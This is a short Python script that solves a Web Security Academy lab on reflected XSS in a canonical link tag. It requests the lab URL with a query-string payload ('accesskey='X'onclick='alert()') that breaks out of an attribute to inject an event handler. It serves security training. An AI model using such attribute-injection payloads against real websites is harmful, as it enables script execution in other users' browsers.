########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 23/11/2023
#
# Lab: Reflected XSS in canonical link tag
#
# Steps: 1. Inject payload as a query string of the URL to call the alert function
#        2. The script will be executed after pressing the correct key combinations
#
########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a6700580324978b803553fd004f00e6.web-security-academy.net"

# payload to call the alert function
payload = "?'accesskey='X'onclick='alert()"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}{payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload as a query string of the URL to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



